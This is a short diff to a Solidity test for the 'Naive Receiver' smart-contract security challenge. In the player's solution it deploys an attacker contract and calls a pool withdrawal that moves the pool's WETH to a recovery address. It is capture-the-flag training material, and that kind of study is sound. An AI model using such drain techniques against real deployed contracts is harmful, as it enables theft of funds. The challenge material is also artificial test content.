@@ -81,7 +81,7 @@ contract NaiveReceiverChallenge is Test {
     function test_naiveReceiver() public checkSolvedByPlayer {
         // Deploy attacker's contract
         attacker = new AttackNaiveReceiver(address(pool), address(receiver));
-        weth.transferFrom(address(receiver), address(recovery), WETH_IN_RECEIVER);
+        pool.withdraw(WETH_IN_POOL, payable(recovery));
     }
 
     /**
